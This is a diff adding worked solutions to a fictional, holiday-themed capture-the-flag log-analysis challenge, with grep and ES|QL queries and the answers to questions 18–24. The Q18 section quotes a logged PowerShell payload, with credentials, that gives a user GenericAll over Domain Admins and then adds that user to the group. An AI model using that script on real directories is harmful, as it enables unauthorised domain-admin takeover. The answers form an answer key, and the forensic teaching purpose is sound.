@@ -330,11 +330,66 @@ The last event records the name of the file share `WishLists` in fields such as 
 Q18: The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?  
 Answer: fR0s3nF1@k3_s
 
-TBC
+For this question, the Linux command line tool `grep` seems more effective in exploring the filtered events. The two log files first need to be combined into one (in this case, it is `log_chunk_all.log`). Then two case-insensitive grep searches using the attacker's username `nutcrackr` and `powershell` are performed:
+`$ cat log_chunk_all.log | grep -iF "nutcrakr" | grep -iF "powershell"`
+
+121 lines of events are filtered out, two of which show the password `fR0s3nF1@k3_s` for the account in the `Payload` field:  
+```
+<134>1 2024-09-16T11:33:12-04:00 SleighRider.northpole.local WindowsEvent - - - {"ContextInfo": " Severity = Informational\r\n Host Name = Default Host\r\n Host Version = 5.1.19041.1\r\n Host ID = 4571e982-1bfd-4d83-97f2-ce85d3e41b9d\r\n Host Application = powershell\r\n Engine Version = 5.1.19041.1\r\n Runspace ID = dd0ca0e4-fdfe-49be-ada7-2931df92cca6\r\n Pipeline ID = 1\r\n Command Name = Set-StrictMode\r\n Command Type = Cmdlet\r\n Script Name = \r\n Command Path = \r\n Sequence Number = 30\r\n User = NORTHPOLE\\elf_user02\r\n Connected User = \r\n Shell ID = Microsoft.PowerShell\r\n", "UserData": "", "Payload": "Add-Type -AssemblyName System.DirectoryServices\n$ldapConnString = \"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\"\n$username = \"nutcrakr\"\n$pswd = 'fR0s3nF1@k3_s'\n$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$propGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"northpole.local\\$username\")).Translate([System.Security.Principal.SecurityIdentifier])\n$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None\n$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\"), ([System.Security.AccessControl.AccessControlType] \"Allow\"), $propGUID, $inheritanceType, $nullGUID\n$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $pswd\n$secOptions = $domainDirEntry.get_Options()\n$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n$domainDirEntry.RefreshCache()\n$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)\n$domainDirEntry.CommitChanges()\n$domainDirEntry.dispose()\n$ldapConnString = \"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\"\n$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $pswd\n$user = New-Object System.Security.Principal.NTAccount(\"northpole.local\\$username\")\n$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])\n$b=New-Object byte[] $sid.BinaryLength\n$sid.GetBinaryForm($b,0)\n$hexSID=[BitConverter]::ToString($b).Replace('-','')\n$domainDirEntry.Add(\"LDAP://<SID=$hexSID>\")\n$domainDirEntry.CommitChanges()\n$domainDirEntry.dispose()", "Provider_Name": "Microsoft-Windows-PowerShell", "Provider_Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "EventID": 4103,
+...
+```
 
 Q19: The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?  
 Answer: 2024-09-16T15:35:57.000Z
 
+Such events are captured in the `WindowsEvent` log and the `event.LogonType` field can be used as a filter. Remote connections have a `LogonType` value of 10:  
+`FROM .ds-logs-* | WHERE event_source == "WindowsEvent" AND event.LogonType == 10`
+
+3 events are filtered out and the earliest one has a timestamp value of `"2024-09-16T15:35:57.000Z`:  
+```
+{ "@timestamp": "2024-09-16T15:35:57.000Z", "@version": "1", "data_stream.dataset": "generic", "data_stream.namespace": "default", "data_stream.type": "logs", "event.ActivityID": "{D72392BD-843F-0000-1F93-23D73F84DA01}",
+...
+"event.LogonType": 10, "event.MoreDetails": "Group membership information.\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\nThis event is generated when the Audit Group Membership subcategory is configured. The Logon ID field can be used to correlate this event with the corresponding user logon event as well as to any other security audit events generated during this logon session.", "event.NetworkInformation_SourceNetworkAddress": null,
+...
+"event.SubjectUserName": "DC01$", "event.SubjectUserSid": "S-1-5-18", "event.Subject_AccountDomain": "NORTHPOLE", "event.Subject_AccountName": "DC01$", "event.Subject_LogonID": "0x3E7", "event.Subject_SecurityID": "S-1-5-18", "event.TargetDomainName": "NORTHPOLE", "event.TargetLinkedLogonId": null, "event.TargetLogonId": "0xdd425e", "event.TargetOutboundDomainName": null, "event.TargetOutboundUserName": null, "event.TargetUserName": "nutcrakr", "event.TargetUserSid": "S-1-5-21-3699322559-1991583901-1175093138-1112", "event.Task": 12554, "event.ThreadID": 1124, "event.TransmittedServices": null, "event.Version": 0, "event.VirtualAccount": null, "event.WorkstationName": null, "event_source": "WindowsEvent", "host.ip": "172.18.0.5", "hostname": "dc01.northpole.local", "log.syslog.facility.code": 1, "log.syslog.facility.name": "user-level", "log.syslog.facility.name.text": "user-level", "log.syslog.severity.code": 5, "log.syslog.severity.name": "notice", "log.syslog.severity.name.text": "notice", "tags": "match", "type": "syslog" }
+```
+
 Q20: The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?  
 Answer: `"C:\Windows\system32\NOTEPAD.EXE" C:\WishLists\santadms_only\its_my_fakelst.txt`
 
+File paths are typically recorded as part of the command line. There are fields that record this information, such as `event.TargetFilename` and `event.CommandLine`, and their values can be listed using this query:  
+`FROM .ds-logs-* | WHERE event_source == "WindowsEvent"| STATS count(*) BY event.CommandLine`
+
+This is the one event that has a suspicious looking command relating to file creation:  
+```
+{ "@timestamp": "2024-09-16T15:36:28.000Z", "@version": "1", "data_stream.dataset": "generic", "data_stream.namespace": "default", "data_stream.type": "logs", "event.AccountName": "SYSTEM", "event.AccountType": "User", "event.Category": "Process Create (rule: ProcessCreate)", "event.Channel": "Microsoft-Windows-Sysmon/Operational", "event.CommandLine": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\WishLists\\santadms_only\\its_my_fakelst.txt", "event.Company": "Microsoft Corporation", "event.CurrentDirectory": "C:\\WishLists\\santadms_only\\", "event.Description": "Notepad", "event.Domain": "NT AUTHORITY", "event.EventID": 1, "event.EventTime": "2024-09-16T15:36:28.000Z", "event.EventType": "INFO", "event.FileVersion": "10.0.17763.1697 (WinBuild.160101.0800)", "event.Hashes": "MD5=5394096A1CEBF81AF24E993777CAABF4,SHA256=A28438E1388F272A52559536D99D65BA15B1A8288BE1200E249851FDF7EE6C7E,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E", "event.Hostname": "dc01.northpole.local", "event.Image": "C:\\Windows\\System32\\notepad.exe", "event.IntegrityLevel": "Medium", "event.Keywords": "-9223372036854775808", "event.LogonGuid": "{f151dc49-500d-660c-5e42-dd0000000000}", "event.LogonId": "0xdd425e", "event.MoreDetails": "Process Create:", "event.OpcodeDisplayNameText": "Info", "event.OpcodeValue": 0, "event.OriginalFileName": "NOTEPAD.EXE", "event.ParentCommandLine": "C:\\Windows\\Explorer.EXE", "event.ParentImage": "C:\\Windows\\explorer.exe", "event.ParentProcessGuid": "{f151dc49-500f-660c-5902-000000000900}", "event.ParentProcessId": 1364, "event.ParentUser": "NORTHPOLE\\nutcrakr", "event.ProcessGuid": "{f151dc49-502c-660c-8702-000000000900}", "event.ProcessID": 6468, "event.ProcessId": 9152, "event.Product": "Microsoft® Windows® Operating System", "event.ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "event.RecordNumber": 641, "event.RuleName": "-", "event.Severity": "INFO", "event.SeverityValue": 2, "event.SourceModuleName": "inSysmon", "event.SourceModuleType": "im_msvistalog", "event.SourceName": "Microsoft-Windows-Sysmon", "event.Task": 1, "event.TerminalSessionId": 2, "event.ThreadID": 4816, "event.User": "NORTHPOLE\\nutcrakr", "event.UserID": "S-1-5-18", "event.Version": 5, "event_source": "WindowsEvent", "host.ip": "172.18.0.5", "hostname": "dc01.northpole.local", "log.syslog.facility.code": 1, "log.syslog.facility.name": "user-level", "log.syslog.facility.name.text": "user-level", "log.syslog.severity.code": 5, "log.syslog.severity.name": "notice", "log.syslog.severity.name.text": "notice", "tags": "match", "type": "syslog" }
+```
+
+The actual command executed, i.e. `"C:\Windows\system32\NOTEPAD.EXE\" C:\WishLists\santadms_only\its_my_fakelst.txt"`, can be found in the `event.CommandLine` field. It attempted to create an alternative naughty and nice list in the file named `its_my_fakelst.txt`.
+
+Q21: The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?  
+Answer: 4
+
+In the email log (from the source `SnowGlowMailPxy`) the sender's email address is recorded in the `event.From` field. This query lists all unique sender email addresses (571 altogether) from this event source:  
+`FROM .ds-logs-* | WHERE event_source == "SnowGlowMailPxy" | STATS count(*) BY event.From`
+
+It is observed that some addresses are of the form `wcubNNN@northpole.local`, where `NNN` is a 3-digit number. These are addresses that belong to the Wombley faction. The number of unique users within this faction can be using the query below. There are 4 such users.  
+`FROM .ds-logs-* | WHERE event_source == "SnowGlowMailPxy" AND event.From LIKE "wcub*" | STATS count(*) BY event.From`
+
+Q22: The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?  
+Answer: 22 
+
+Similar, the Alabaster faction users can be identified by their email addresses, which are of the form `asnowballNNN@northpole.local`, where `NNN` is a 3-digit number. The query below counts the number of events where Alabaster faction users have sent emails to those in the Wombley faction. There are 22 in total.  
+`FROM .ds-logs-* | WHERE event_source == "SnowGlowMailPxy" AND event.To LIKE "wcub*" AND event.From LIKE "asnowball*" | STATS count(*)`
+
+
+Q23: Of all the reindeer, there are only nine. What's the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.  
+Answer: rud01ph.glow
+
+The query below uses the string processing function `DISSECT` in ES|QL to extract the domain for all sender addresses. There are 41 unique domains. Browsing through the entire list, it can be noted that `rud01ph.glow` is the domain for Rudolph the red-nosed reindeer.
+`FROM .ds-logs-* | WHERE event_source == "SnowGlowMailPxy" | DISSECT event.From """%{name}@%{domain}""" | STATS count(*) BY domain`
+
+Q24: With a fiery tail seen once in great years, what's the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.  
+A: c0m3t.halleys
+
+Using the query results from the previous question, the domain `c0m3t.halleys` can be spotted in the list. It is named after Halley's comet, which can be observed from Earth once every 76 years. "Comet" is also the name of one of the nine reindeers.
